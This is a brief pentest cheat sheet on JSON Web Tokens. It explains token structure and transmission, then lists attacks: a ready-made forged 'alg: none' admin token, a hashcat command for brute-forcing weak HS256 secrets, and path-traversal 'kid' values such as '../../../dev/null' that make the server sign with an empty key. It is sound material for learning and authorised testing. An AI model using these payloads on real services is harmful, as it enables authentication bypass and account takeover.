# JSON WEB TOKEN (JWT)

https://jwt.io/

***exemple :***  
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw

They are divided in 3 pars separated by a dot, they are basically base64 encoded

***Header : ***eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9

***Payload : ***eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ

***Signature : ***C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw

### Header

{
  "typ": "JWT",
  "alg": "HS256"
}


### Payload 

{
  "username": "guest",
  "exp": 1665076836
}

### Signature

Signature is calculated with the server secret key.  
Without it, it's difficult to recreate a new valid one


## Transmission

JWTs can be transmitted in cookies, in HTTP common header or dedicated headers

They are often used in HTTP headers like this:  
`Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...`


## Encryption 

Signature can be generated with symmetric (e.g. HS256) or asymmetric (e.g. RS256) encryption



## Vulnerabilities


#### None, none, NONE, nOnE algorithm  
Modify the header section of the token so that the alg header would contain the value none.    
Remove the signature part but leave the dot, the dot is important  
Patch a while ago but can work on old configurations  

***Example :***  
`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0=.`

***header : ***{"typ":"JWT","alg":"none"}  

***payload : ***{"username":"admin"}

NOTE : IT IS POSSIBLE TO USE ANY CASE VARIATION

#### Weak secret key

Symmetric encryption
***Example with a 4 digit key***

```bash
hashcat jwt.txt -m 16500 -a 3 -w 2 ?d?d?d?d
```

#### No signature verification

Rare but, it happens sometimes

#### Unsecure file signature

Sometimes, the header can contains a "kid" key that links to a file where the server secret key is stored  

***Example : ***
```
{
  "alg": "HS256",
  "kid": "../key/secretkey.txt",
  "typ": "JWT"
}
```

If the jwt is signed with the content of the file, we can edit this file to make it point to /dev/null for example (which signes with a null string : %00)  

***Example : ***  
```
{
  "alg": "HS256", 
  "kid": "../../../dev/null",
  "typ": "JWT"
}
```